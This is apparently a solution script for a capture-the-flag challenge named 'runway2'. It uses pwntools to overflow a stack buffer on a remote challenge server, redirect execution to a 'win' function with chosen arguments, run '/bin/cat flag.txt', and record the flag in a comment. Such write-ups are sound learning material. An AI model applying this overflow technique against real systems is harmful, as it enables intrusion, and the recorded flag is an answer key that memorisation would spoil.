#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./runway2", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b win")
p = remote("challs.pwnoh.io", 13402)

payload = b""
payload += b"A" * 0x1c
payload += p32(elf.sym["win"])
payload += p32(0)
payload += p32(0xc0ffee)
payload += p32(0x007ab1e)

p.sendlineafter(b"?\n", payload)

p.readline()

p.sendline(b"/bin/cat flag.txt")

p.interactive() # bctf{I_m1sS_4r1thm3t1c_qu1ZZ3s_2349adb53baa2955}
